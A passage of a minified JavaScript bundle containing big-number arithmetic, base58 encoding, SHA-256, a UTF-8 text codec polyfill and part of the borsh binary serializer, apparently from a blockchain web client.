s(0),j=C.clone();_.cmpn(1)>0&&C.cmpn(1)>0;){for(var H=0,D=1;!(_.words[0]&D)&&H<26;++H,D<<=1);if(H>0)for(_.iushrn(H);H-- >0;)M.isOdd()&&M.iadd(j),M.iushrn(1);for(var y=0,V=1;!(C.words[0]&V)&&y<26;++y,V<<=1);if(y>0)for(C.iushrn(y);y-- >0;)R.isOdd()&&R.iadd(j),R.iushrn(1);_.cmp(C)>=0?(_.isub(C),M.isub(R)):(C.isub(_),R.isub(M))}var oe;return _.cmpn(1)===0?oe=M:oe=R,oe.cmpn(0)<0&&oe.iadd(d),oe},s.prototype.gcd=function(d){if(this.isZero())return d.abs();if(d.isZero())return this.abs();var _=this.clone(),C=d.clone();_.negative=0,C.negative=0;for(var M=0;_.isEven()&&C.isEven();M++)_.iushrn(1),C.iushrn(1);do{for(;_.isEven();)_.iushrn(1);for(;C.isEven();)C.iushrn(1);var R=_.cmp(C);if(R<0){var j=_;_=C,C=j}else if(R===0||C.cmpn(1)===0)break;_.isub(C)}while(!0);return C.iushln(M)},s.prototype.invm=function(d){return this.egcd(d).a.umod(d)},s.prototype.isEven=function(){return(this.words[0]&1)===0},s.prototype.isOdd=function(){return(this.words[0]&1)===1},s.prototype.andln=function(d){return this.words[0]&d},s.prototype.bincn=function(d){r(typeof d=="number");var _=d%26,C=(d-_)/26,M=1<<_;if(this.length<=C)return this._expand(C+1),this.words[C]|=M,this;for(var R=M,j=C;R!==0&&j<this.length;j++){var H=this.words[j]|0;H+=R,R=H>>>26,H&=67108863,this.words[j]=H}return R!==0&&(this.words[j]=R,this.length++),this},s.prototype.isZero=function(){return this.length===1&&this.words[0]===0},s.prototype.cmpn=function(d){var _=d<0;if(this.negative!==0&&!_)return-1;if(this.negative===0&&_)return 1;this._strip();var C;if(this.length>1)C=1;else{_&&(d=-d),r(d<=67108863,"Number is too big");var M=this.words[0]|0;C=M===d?0:M<d?-1:1}return this.negative!==0?-C|0:C},s.prototype.cmp=function(d){if(this.negative!==0&&d.negative===0)return-1;if(this.negative===0&&d.negative!==0)return 1;var _=this.ucmp(d);return this.negative!==0?-_|0:_},s.prototype.ucmp=function(d){if(this.length>d.length)return 1;if(this.length<d.length)return-1;for(var _=0,C=this.length-1;C>=0;C--){var M=this.words[C]|0,R=d.words[C]|0;if(M!==R){M<R?_=-1:M>R&&(_=1);break}}return _},s.prototype.gtn=function(d){return this.cmpn(d)===1},s.prototype.gt=function(d){return this.cmp(d)===1},s.prototype.gten=function(d){return this.cmpn(d)>=0},s.prototype.gte=function(d){return this.cmp(d)>=0},s.prototype.ltn=function(d){return this.cmpn(d)===-1},s.prototype.lt=function(d){return this.cmp(d)===-1},s.prototype.lten=function(d){return this.cmpn(d)<=0},s.prototype.lte=function(d){return this.cmp(d)<=0},s.prototype.eqn=function(d){return this.cmpn(d)===0},s.prototype.eq=function(d){return this.cmp(d)===0},s.red=function(d){return new $(d)},s.prototype.toRed=function(d){return r(!this.red,"Already a number in reduction context"),r(this.negative===0,"red works only with positives"),d.convertTo(this)._forceRed(d)},s.prototype.fromRed=function(){return r(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},s.prototype._forceRed=function(d){return this.red=d,this},s.prototype.forceRed=function(d){return r(!this.red,"Already a number in reduction context"),this._forceRed(d)},s.prototype.redAdd=function(d){return r(this.red,"redAdd works only with red numbers"),this.red.add(this,d)},s.prototype.redIAdd=function(d){return r(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,d)},s.prototype.redSub=function(d){return r(this.red,"redSub works only with red numbers"),this.red.sub(this,d)},s.prototype.redISub=function(d){return r(this.red,"redISub works only with red numbers"),this.red.isub(this,d)},s.prototype.redShl=function(d){return r(this.red,"redShl works only with red numbers"),this.red.shl(this,d)},s.prototype.redMul=function(d){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,d),this.red.mul(this,d)},s.prototype.redIMul=function(d){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,d),this.red.imul(this,d)},s.prototype.redSqr=function(){return r(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},s.prototype.redISqr=function(){return r(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},s.prototype.redSqrt=function(){return r(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},s.prototype.redInvm=function(){return r(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},s.prototype.redNeg=function(){return r(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},s.prototype.redPow=function(d){return r(this.red&&!d.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,d)};var W={k256:null,p224:null,p192:null,p25519:null};function q(S,d){this.name=S,this.p=new s(d,16),this.n=this.p.bitLength(),this.k=new s(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}q.prototype._tmp=function(){var d=new s(null);return d.words=new Array(Math.ceil(this.n/13)),d},q.prototype.ireduce=function(d){var _=d,C;do this.split(_,this.tmp),_=this.imulK(_),_=_.iadd(this.tmp),C=_.bitLength();while(C>this.n);var M=C<this.n?-1:_.ucmp(this.p);return M===0?(_.words[0]=0,_.length=1):M>0?_.isub(this.p):_.strip!==void 0?_.strip():_._strip(),_},q.prototype.split=function(d,_){d.iushrn(this.n,0,_)},q.prototype.imulK=function(d){return d.imul(this.k)};function L(){q.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}i(L,q),L.prototype.split=function(d,_){for(var C=4194303,M=Math.min(d.length,9),R=0;R<M;R++)_.words[R]=d.words[R];if(_.length=M,d.length<=9){d.words[0]=0,d.length=1;return}var j=d.words[9];for(_.words[_.length++]=j&C,R=10;R<d.length;R++){var H=d.words[R]|0;d.words[R-10]=(H&C)<<4|j>>>22,j=H}j>>>=22,d.words[R-10]=j,j===0&&d.length>10?d.length-=10:d.length-=9},L.prototype.imulK=function(d){d.words[d.length]=0,d.words[d.length+1]=0,d.length+=2;for(var _=0,C=0;C<d.length;C++){var M=d.words[C]|0;_+=M*977,d.words[C]=_&67108863,_=M*64+(_/67108864|0)}return d.words[d.length-1]===0&&(d.length--,d.words[d.length-1]===0&&d.length--),d};function N(){q.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}i(N,q);function B(){q.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}i(B,q);function z(){q.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}i(z,q),z.prototype.imulK=function(d){for(var _=0,C=0;C<d.length;C++){var M=(d.words[C]|0)*19+_,R=M&67108863;M>>>=26,d.words[C]=R,_=M}return _!==0&&(d.words[d.length++]=_),d},s._prime=function(d){if(W[d])return W[d];var _;if(d==="k256")_=new L;else if(d==="p224")_=new N;else if(d==="p192")_=new B;else if(d==="p25519")_=new z;else throw new Error("Unknown prime "+d);return W[d]=_,_};function $(S){if(typeof S=="string"){var d=s._prime(S);this.m=d.p,this.prime=d}else r(S.gtn(1),"modulus must be greater than 1"),this.m=S,this.prime=null}$.prototype._verify1=function(d){r(d.negative===0,"red works only with positives"),r(d.red,"red works only with red numbers")},$.prototype._verify2=function(d,_){r((d.negative|_.negative)===0,"red works only with positives"),r(d.red&&d.red===_.red,"red works only with red numbers")},$.prototype.imod=function(d){return this.prime?this.prime.ireduce(d)._forceRed(this):(h(d,d.umod(this.m)._forceRed(this)),d)},$.prototype.neg=function(d){return d.isZero()?d.clone():this.m.sub(d)._forceRed(this)},$.prototype.add=function(d,_){this._verify2(d,_);var C=d.add(_);return C.cmp(this.m)>=0&&C.isub(this.m),C._forceRed(this)},$.prototype.iadd=function(d,_){this._verify2(d,_);var C=d.iadd(_);return C.cmp(this.m)>=0&&C.isub(this.m),C},$.prototype.sub=function(d,_){this._verify2(d,_);var C=d.sub(_);return C.cmpn(0)<0&&C.iadd(this.m),C._forceRed(this)},$.prototype.isub=function(d,_){this._verify2(d,_);var C=d.isub(_);return C.cmpn(0)<0&&C.iadd(this.m),C},$.prototype.shl=function(d,_){return this._verify1(d),this.imod(d.ushln(_))},$.prototype.imul=function(d,_){return this._verify2(d,_),this.imod(d.imul(_))},$.prototype.mul=function(d,_){return this._verify2(d,_),this.imod(d.mul(_))},$.prototype.isqr=function(d){return this.imul(d,d.clone())},$.prototype.sqr=function(d){return this.mul(d,d)},$.prototype.sqrt=function(d){if(d.isZero())return d.clone();var _=this.m.andln(3);if(r(_%2===1),_===3){var C=this.m.add(new s(1)).iushrn(2);return this.pow(d,C)}for(var M=this.m.subn(1),R=0;!M.isZero()&&M.andln(1)===0;)R++,M.iushrn(1);r(!M.isZero());var j=new s(1).toRed(this),H=j.redNeg(),D=this.m.subn(1).iushrn(1),y=this.m.bitLength();for(y=new s(2*y*y).toRed(this);this.pow(y,D).cmp(H)!==0;)y.redIAdd(H);for(var V=this.pow(y,M),oe=this.pow(d,M.addn(1).iushrn(1)),ce=this.pow(d,M),he=R;ce.cmp(j)!==0;){for(var Ce=ce,Ae=0;Ce.cmp(j)!==0;Ae++)Ce=Ce.redSqr();r(Ae<he);var Pe=this.pow(V,new s(1).iushln(he-Ae-1));oe=oe.redMul(Pe),V=Pe.redSqr(),ce=ce.redMul(V),he=Ae}return oe},$.prototype.invm=function(d){var _=d._invmp(this.m);return _.negative!==0?(_.negative=0,this.imod(_).redNeg()):this.imod(_)},$.prototype.pow=function(d,_){if(_.isZero())return new s(1).toRed(this);if(_.cmpn(1)===0)return d.clone();var C=4,M=new Array(1<<C);M[0]=new s(1).toRed(this),M[1]=d;for(var R=2;R<M.length;R++)M[R]=this.mul(M[R-1],d);var j=M[0],H=0,D=0,y=_.bitLength()%26;for(y===0&&(y=26),R=_.length-1;R>=0;R--){for(var V=_.words[R],oe=y-1;oe>=0;oe--){var ce=V>>oe&1;if(j!==M[0]&&(j=this.sqr(j)),ce===0&&H===0){D=0;continue}H<<=1,H|=ce,D++,!(D!==C&&(R!==0||oe!==0))&&(j=this.mul(j,M[H]),D=0,H=0)}y=26}return j},$.prototype.convertTo=function(d){var _=d.umod(this.m);return _===d?_.clone():_},$.prototype.convertFrom=function(d){var _=d.clone();return _.red=null,_},s.mont=function(d){return new K(d)};function K(S){$.call(this,S),this.shift=this.m.bitLength(),this.shift%26!==0&&(this.shift+=26-this.shift%26),this.r=new s(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}i(K,$),K.prototype.convertTo=function(d){return this.imod(d.ushln(this.shift))},K.prototype.convertFrom=function(d){var _=this.imod(d.mul(this.rinv));return _.red=null,_},K.prototype.imul=function(d,_){if(d.isZero()||_.isZero())return d.words[0]=0,d.length=1,d;var C=d.imul(_),M=C.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),R=C.isub(M).iushrn(this.shift),j=R;return R.cmp(this.m)>=0?j=R.isub(this.m):R.cmpn(0)<0&&(j=R.iadd(this.m)),j._forceRed(this)},K.prototype.mul=function(d,_){if(d.isZero()||_.isZero())return new s(0)._forceRed(this);var C=d.mul(_),M=C.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),R=C.isub(M).iushrn(this.shift),j=R;return R.cmp(this.m)>=0?j=R.isub(this.m):R.cmpn(0)<0&&(j=R.iadd(this.m)),j._forceRed(this)},K.prototype.invm=function(d){var _=this.imod(d._invmp(this.m).mul(this.r2));return _._forceRed(this)}})(n,di)})(qw);var yb=qw.exports;const yE=Eo(yb);var U0={exports:{}};/*! safe-buffer. MIT License. Feross Aboukhadijeh <https://feross.org/opensource> */(function(n,e){var t=ve,r=t.Buffer;function i(o,a){for(var l in o)a[l]=o[l]}r.from&&r.alloc&&r.allocUnsafe&&r.allocUnsafeSlow?n.exports=t:(i(t,e),e.Buffer=s);function s(o,a,l){return r(o,a,l)}s.prototype=Object.create(r.prototype),i(r,s),s.from=function(o,a,l){if(typeof o=="number")throw new TypeError("Argument must not be a number");return r(o,a,l)},s.alloc=function(o,a,l){if(typeof o!="number")throw new TypeError("Argument must be a number");var u=r(o);return a!==void 0?typeof l=="string"?u.fill(a,l):u.fill(a):u.fill(0),u},s.allocUnsafe=function(o){if(typeof o!="number")throw new TypeError("Argument must be a number");return r(o)},s.allocUnsafeSlow=function(o){if(typeof o!="number")throw new TypeError("Argument must be a number");return t.SlowBuffer(o)}})(U0,U0.exports);var wb=U0.exports,af=wb.Buffer;function sL(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(w){if((Array.isArray(w)||w instanceof Uint8Array)&&(w=af.from(w)),!af.isBuffer(w))throw new TypeError("Expected Buffer");if(w.length===0)return"";for(var x=0,k=0,I=0,A=w.length;I!==A&&w[I]===0;)I++,x++;for(var b=(A-I)*u+1>>>0,E=new Uint8Array(b);I!==A;){for(var O=w[I],W=0,q=b-1;(O!==0||W<k)&&q!==-1;q--,W++)O+=256*E[q]>>>0,E[q]=O%o>>>0,O=O/o>>>0;if(O!==0)throw new Error("Non-zero carry");k=W,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return af.alloc(0);for(var x=0,k=0,I=0;w[x]===a;)k++,x++;for(var A=(w.length-x)*l+1>>>0,b=new Uint8Array(A);x<w.length;){var E=w.charCodeAt(x);if(E>255)return;var O=e[E];if(O===255)return;for(var W=0,q=A-1;(O!==0||W<I)&&q!==-1;q--,W++)O+=o*b[q]>>>0,b[q]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");I=W,x++}for(var L=A-I;L!==A&&b[L]===0;)L++;var N=af.allocUnsafe(k+(A-L));N.fill(0,0,k);for(var B=k;L!==A;)N[B++]=b[L++];return N}function p(w){var x=f(w);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:p}}var oL=sL,aL=oL,lL="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",cL=aL(lL);const Bn=Eo(cL),uL=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Cs=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Rs=new Uint32Array(64);class hL extends ob{constructor(){super(64,32,8,!1),this.A=Cs[0]|0,this.B=Cs[1]|0,this.C=Cs[2]|0,this.D=Cs[3]|0,this.E=Cs[4]|0,this.F=Cs[5]|0,this.G=Cs[6]|0,this.H=Cs[7]|0}get(){const{A:e,B:t,C:r,D:i,E:s,F:o,G:a,H:l}=this;return[e,t,r,i,s,o,a,l]}set(e,t,r,i,s,o,a,l){this.A=e|0,this.B=t|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=l|0}process(e,t){for(let f=0;f<16;f++,t+=4)Rs[f]=e.getUint32(t,!1);for(let f=16;f<64;f++){const p=Rs[f-15],w=Rs[f-2],x=vi(p,7)^vi(p,18)^p>>>3,k=vi(w,17)^vi(w,19)^w>>>10;Rs[f]=k+Rs[f-7]+x+Rs[f-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:l,G:u,H:h}=this;for(let f=0;f<64;f++){const p=vi(a,6)^vi(a,11)^vi(a,25),w=h+p+GP(a,l,u)+uL[f]+Rs[f]|0,k=(vi(r,2)^vi(r,13)^vi(r,22))+QP(r,i,s)|0;h=u,u=l,l=a,a=o+w|0,o=s,s=i,i=r,r=w+k|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,l=l+this.F|0,u=u+this.G|0,h=h+this.H|0,this.set(r,i,s,o,a,l,u,h)}roundClean(){Rs.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const j0=ib(()=>new hL);var Dn={},lf=wb.Buffer;function fL(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(w){if((Array.isArray(w)||w instanceof Uint8Array)&&(w=lf.from(w)),!lf.isBuffer(w))throw new TypeError("Expected Buffer");if(w.length===0)return"";for(var x=0,k=0,I=0,A=w.length;I!==A&&w[I]===0;)I++,x++;for(var b=(A-I)*u+1>>>0,E=new Uint8Array(b);I!==A;){for(var O=w[I],W=0,q=b-1;(O!==0||W<k)&&q!==-1;q--,W++)O+=256*E[q]>>>0,E[q]=O%o>>>0,O=O/o>>>0;if(O!==0)throw new Error("Non-zero carry");k=W,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return lf.alloc(0);for(var x=0,k=0,I=0;w[x]===a;)k++,x++;for(var A=(w.length-x)*l+1>>>0,b=new Uint8Array(A);x<w.length;){var E=w.charCodeAt(x);if(E>255)return;var O=e[E];if(O===255)return;for(var W=0,q=A-1;(O!==0||W<I)&&q!==-1;q--,W++)O+=o*b[q]>>>0,b[q]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");I=W,x++}for(var L=A-I;L!==A&&b[L]===0;)L++;var N=lf.allocUnsafe(k+(A-L));N.fill(0,0,k);for(var B=k;L!==A;)N[B++]=b[L++];return N}function p(w){var x=f(w);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:p}}var dL=fL,pL=dL,gL="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",mL=pL(gL);function Gi(n,e,t){return e<=n&&n<=t}function xp(n){if(n===void 0)return{};if(n===Object(n))return n;throw TypeError("Could not convert argument to dictionary")}function yL(n){for(var e=String(n),t=e.length,r=0,i=[];r<t;){var s=e.charCodeAt(r);if(s<55296||s>57343)i.push(s);else if(56320<=s&&s<=57343)i.push(65533);else if(55296<=s&&s<=56319)if(r===t-1)i.push(65533);else{var o=n.charCodeAt(r+1);if(56320<=o&&o<=57343){var a=s&1023,l=o&1023;i.push(65536+(a<<10)+l),r+=1}else i.push(65533)}r+=1}return i}function wL(n){for(var e="",t=0;t<n.length;++t){var r=n[t];r<=65535?e+=String.fromCharCode(r):(r-=65536,e+=String.fromCharCode((r>>10)+55296,(r&1023)+56320))}return e}var Id=-1;function Kw(n){this.tokens=[].slice.call(n)}Kw.prototype={endOfStream:function(){return!this.tokens.length},read:function(){return this.tokens.length?this.tokens.shift():Id},prepend:function(n){if(Array.isArray(n))for(var e=n;e.length;)this.tokens.unshift(e.pop());else this.tokens.unshift(n)},push:function(n){if(Array.isArray(n))for(var e=n;e.length;)this.tokens.push(e.shift());else this.tokens.push(n)}};var Bl=-1;function em(n,e){if(n)throw TypeError("Decoder error");return e||65533}var Sd="utf-8";function Td(n,e){if(!(this instanceof Td))return new Td(n,e);if(n=n!==void 0?String(n).toLowerCase():Sd,n!==Sd)throw new Error("Encoding not supported. Only utf-8 is supported");e=xp(e),this._streaming=!1,this._BOMseen=!1,this._decoder=null,this._fatal=!!e.fatal,this._ignoreBOM=!!e.ignoreBOM,Object.defineProperty(this,"encoding",{value:"utf-8"}),Object.defineProperty(this,"fatal",{value:this._fatal}),Object.defineProperty(this,"ignoreBOM",{value:this._ignoreBOM})}Td.prototype={decode:function(e,t){var r;typeof e=="object"&&e instanceof ArrayBuffer?r=new Uint8Array(e):typeof e=="object"&&"buffer"in e&&e.buffer instanceof ArrayBuffer?r=new Uint8Array(e.buffer,e.byteOffset,e.byteLength):r=new Uint8Array(0),t=xp(t),this._streaming||(this._decoder=new vL({fatal:this._fatal}),this._BOMseen=!1),this._streaming=!!t.stream;for(var i=new Kw(r),s=[],o;!i.endOfStream()&&(o=this._decoder.handler(i,i.read()),o!==Bl);)o!==null&&(Array.isArray(o)?s.push.apply(s,o):s.push(o));if(!this._streaming){do{if(o=this._decoder.handler(i,i.read()),o===Bl)break;o!==null&&(Array.isArray(o)?s.push.apply(s,o):s.push(o))}while(!i.endOfStream());this._decoder=null}return s.length&&["utf-8"].indexOf(this.encoding)!==-1&&!this._ignoreBOM&&!this._BOMseen&&(s[0]===65279?(this._BOMseen=!0,s.shift()):this._BOMseen=!0),wL(s)}};function Ad(n,e){if(!(this instanceof Ad))return new Ad(n,e);if(n=n!==void 0?String(n).toLowerCase():Sd,n!==Sd)throw new Error("Encoding not supported. Only utf-8 is supported");e=xp(e),this._streaming=!1,this._encoder=null,this._options={fatal:!!e.fatal},Object.defineProperty(this,"encoding",{value:"utf-8"})}Ad.prototype={encode:function(e,t){e=e?String(e):"",t=xp(t),this._streaming||(this._encoder=new _L(this._options)),this._streaming=!!t.stream;for(var r=[],i=new Kw(yL(e)),s;!i.endOfStream()&&(s=this._encoder.handler(i,i.read()),s!==Bl);)Array.isArray(s)?r.push.apply(r,s):r.push(s);if(!this._streaming){for(;s=this._encoder.handler(i,i.read()),s!==Bl;)Array.isArray(s)?r.push.apply(r,s):r.push(s);this._encoder=null}return new Uint8Array(r)}};function vL(n){var e=n.fatal,t=0,r=0,i=0,s=128,o=191;this.handler=function(a,l){if(l===Id&&i!==0)return i=0,em(e);if(l===Id)return Bl;if(i===0){if(Gi(l,0,127))return l;if(Gi(l,194,223))i=1,t=l-192;else if(Gi(l,224,239))l===224&&(s=160),l===237&&(o=159),i=2,t=l-224;else if(Gi(l,240,244))l===240&&(s=144),l===244&&(o=143),i=3,t=l-240;else return em(e);return t=t<<6*i,null}if(!Gi(l,s,o))return t=i=r=0,s=128,o=191,a.prepend(l),em(e);if(s=128,o=191,r+=1,t+=l-128<<6*(i-r),r!==i)return null;var u=t;return t=i=r=0,u}}function _L(n){n.fatal,this.handler=function(e,t){if(t===Id)return Bl;if(Gi(t,0,127))return t;var r,i;Gi(t,128,2047)?(r=1,i=192):Gi(t,2048,65535)?(r=2,i=224):Gi(t,65536,1114111)&&(r=3,i=240);for(var s=[(t>>6*r)+i];r>0;){var o=t>>6*(r-1);s.push(128|o&63),r-=1}return s}}const EL=Object.freeze(Object.defineProperty({__proto__:null,TextDecoder:Td,TextEncoder:Ad},Symbol.toStringTag,{value:"Module"})),IL=zy(EL);var SL=di&&di.__createBinding||(Object.create?function(n,e,t,r){r===void 0&&(r=t),Object.defineProperty(n,r,{enumerable:!0,get:function(){return e[t]}})}:function(n,e,t,r){r===void 0&&(r=t),n[r]=e[t]}),TL=di&&di.__setModuleDefault||(Object.create?function(n,e){Object.defineProperty(n,"default",{enumerable:!0,value:e})}:function(n,e){n.default=e}),Di=di&&di.__decorate||function(n,e,t,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,t):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(n,e,t,r);else for(var a=n.length-1;a>=0;a--)(o=n[a])&&(s=(i<3?o(s):i>3?o(e,t,s):o(e,t))||s);return i>3&&s&&Object.defineProperty(e,t,s),s},AL=di&&di.__importStar||function(n){if(n&&n.__esModule)return n;var e={};if(n!=null)for(var t in n)t!=="default"&&Object.hasOwnProperty.call(n,t)&&SL(e,n,t);return TL(e,n),e},vb=di&&di.__importDefault||function(n){return n&&n.__esModule?n:{default:n}};Object.defineProperty(Dn,"__esModule",{value:!0});var _b=Dn.deserializeUnchecked=bb=Dn.deserialize=Ab=Dn.serialize=Dn.BinaryReader=Dn.BinaryWriter=Dn.BorshError=Dn.baseDecode=Dn.baseEncode=void 0;const $s=vb(yb),Eb=vb(mL),bL=AL(IL),xL=typeof TextDecoder!="function"?bL.TextDecoder:TextDecoder,kL=new xL("utf-8",{fatal:!0});function CL(n){return typeof n=="string"&&(n=ve.Buffer.from(n,"utf8")),Eb.default.encode(ve.Buffer.from(n))}Dn.baseEncode=CL;function RL(n){return ve.Buffer.from(Eb.default.decode(n))}Dn.baseDecode=RL;const tm=1024;class sr extends Error{constructor(e){super(e),this.fieldPath=[],this.originalMessage=e}addToFieldPath(e){this.fieldPath.splice(0,0,e),this.message=this.originalMessage+": "+this.fieldPath.join(".")}}Dn.BorshError=sr;class Ib{constructor(){this.buf=ve.Buffer.alloc(tm),this.length=0}maybeResize(){this.buf.length<16+this.length&&(this.buf=ve.Buffer.concat([this.buf,ve.Buffer.alloc(tm)]))}writeU8(e){this.maybeResize(),this.buf.writeUInt8(e,this.length),this.length+=1}writeU16(e){this.maybeResize(),this.buf.writeUInt16LE(e,this.length),this.length+=2}writeU32(e){this.maybeResize(),this.buf.writeUInt32LE(e,this.length),this.length+=4}writeU64(e){this.maybeResize(),this.writeBuffer(ve.Buffer.from(new $s.default(e).toArray("le",8)))}writeU128(e){this.maybeResize(),this.writeBuffer(ve.Buffer.from(new $s.default(e).toArray("le",16)))}writeU256(e){this.maybeResize(),this.writeBuffer(ve.Buffer.from(new $s.default(e).toArray("le",32)))}writeU512(e){this.maybeResize(),this.writeBuffer(ve.Buffer.from(new $s.default(e).toArray("le",64)))}writeBuffer(e){this.buf=ve.Buffer.concat([ve.Buffer.from(this.buf.subarray(0,this.length)),e,ve.Buffer.alloc(tm)]),this.length+=e.length}writeString(e){this.maybeResize();const t=ve.Buffer.from(e,"utf8");this.writeU32(t.length),this.writeBuffer(t)}writeFixedArray(e){this.writeBuffer(ve.Buffer.from(e))}writeArray(e,t){this.maybeResize(),this.writeU32(e.length);for(const r of e)this.maybeResize(),t(r)}toArray(){return this.buf.subarray(0,this.length)}}Dn.BinaryWriter=Ib;function Oi(n,e,t){const r=t.value;t.value=function(...i){try{return r.apply(this,i)}catch(s){if(s instanceof RangeError){const o=s.code;if(["ERR_BUFFER_OUT_OF_BOUNDS","ERR_OUT_OF_RANGE"].indexOf(o)>=0)throw new sr("Reached the end of buffer when deserializing")}throw s}}}class Dr{constructor(e){this.buf=e,this.offset=0}readU8(){const e=this.buf.readUInt8(this.offset);return this.offset+=1,e}readU16(){const e=this.buf.readUInt16LE(this.offset);return this.offset+=2,e}readU32(){const e=this.buf.readUInt32LE(this.offset);return this.offset+=4,e}readU64(){const e=this.readBuffer(8);return new $s.default(e,"le")}readU128(){const e=this.readBuffer(16);return new $s.default(e,"le")}readU256(){const e=this.readBuffer(32);return new $s.default(e,"le")}readU512(){const e=this.readBuffer(64);return new $s.default(e,"le")}readBuffer(e){if(this.offset+e>this.buf.length)throw new sr(`Expected buffer length ${e} isn't within bounds`);const t=this.buf.slice(this.offset,this.offset+e);return this.offset+=e,t}readString(){const e=this.readU32(),t=this.readBuffer(e);try{return kL.decode(t)}catch(r){throw new sr(`Error decoding UTF-8 string: ${r}`)}}readFixedArray(e){return new Uint8Array(this.readBuffer(e))}readArray(e){const t=this.readU32(),r=Array();for(let i=0;i<t;++i)r.push(e());return r}}Di([Oi],Dr.prototype,"readU8",null);Di([Oi],Dr.prototype,"readU16",null);Di([Oi],Dr.prototype,"readU32",null);Di([Oi],Dr.prototype,"readU64",null);Di([Oi],Dr.prototype,"readU128",null);Di([Oi],Dr.prototype,"readU256",null);Di([Oi],Dr.prototype,"readU512",null);Di([Oi],Dr.prototype,"readString",null);Di([Oi],Dr.prototype,"readFixedArray",null);Di([Oi],Dr.prototype,"readArray",null);Dn.BinaryReader=Dr;function Sb(n){return n.charAt(0).toUpperCase()+n.slice(1)}function zo(n,e,t,r,i){try{if(typeof r=="string")i[`write${Sb(r)}`](t);else if(r instanceof Array)if(typeof r[0]=="number"){if(t.length!==r[0])throw new sr(`Expecting byte array of length ${r[0]}, but got ${t.length} bytes`);i.writeFixedArray(t)}else if(r.length===2&&typeof r[1]=="number"){if(t.length!==r[1])throw new sr(`Expecting byte array of length ${r[1]}, but got ${t.length} bytes`);for(let s=0;s<r[1];s++)zo(n,null,t[s],r[0],i)}else i.writeArray(t,s=>{zo(n,e,s,r[0],i)});else if(r.kind!==void 0)switch(r.kind){case"option":{t==null?i.writeU8(0):(i.writeU8(1),zo(n,e,t,r.type,i));break}case"map":{i.writeU32(t.size),t.forEach((s,o)=>{zo(n,e,o,r.key,i),zo(n,e,s,r.value,i)});break}default:throw new sr(`FieldType ${r} unrecognized`)}else Tb(n,t,i)}catch(s){throw s instanceof sr&&s.addToFieldPath(e),s}}function Tb(n,e,t){if(typeof e.borshSerialize=="function"){e.borshSerialize(t);return}const r=n.get(e.constructor);if(!r)throw new sr(`Class ${e.constructor.name} is missing in schema`);if(r.kind==="struct")r.fields.map(([i,s])=>{zo(n,i,e[i],s,t)});else 